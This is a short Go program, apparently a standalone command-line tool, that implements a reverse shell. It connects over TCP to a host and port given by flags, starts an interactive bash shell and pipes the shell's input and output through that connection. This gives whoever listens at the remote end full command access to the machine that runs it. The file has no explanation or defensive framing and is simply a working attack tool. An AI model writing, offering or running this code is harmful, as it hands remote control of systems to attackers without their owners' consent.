package main

import (
	"fmt"
	"github.com/spf13/cobra"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
)

func main() {
	rootCmd := &cobra.Command{
		Use: "main",
		Run: func(cmd *cobra.Command, args []string) {
			host, _ := cmd.Flags().GetString("host")
			port, _ := cmd.Flags().GetInt("port")
			shell, _ := cmd.Flags().GetString("shell")
			connect(host, port, shell)
		},
	}
	rootCmd.Flags().StringP("host", "H", "localhost", "Server host")
	rootCmd.Flags().IntP("port", "P", 1234, "Server port")
	rootCmd.Flags().StringP("shell", "S", "/bin/bash", "User shell")
	rootCmd.Execute()
}

func connect(host string, port int, shell string) {
	log.Printf("Connecting to %s:%d...\n", host, port)
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
	defer conn.Close()
	if err != nil {
		log.Printf("Error connecting to server: %s\n", err)
		return
	}

	currentUser, _ := user.Current()
	currentDir, _ := os.Getwd()

	command := exec.Command(shell, "-i")
	command.Env = append(os.Environ(),
		fmt.Sprintf("PS1=[\\u@\\h \\w]\\$ "),
		fmt.Sprintf("USER=%s", currentUser.Username),
		fmt.Sprintf("PWD=%s", currentDir),
	)

	command.Stdout = conn
	command.Stderr = conn
	command.Stdin = conn
	command.Run()
}
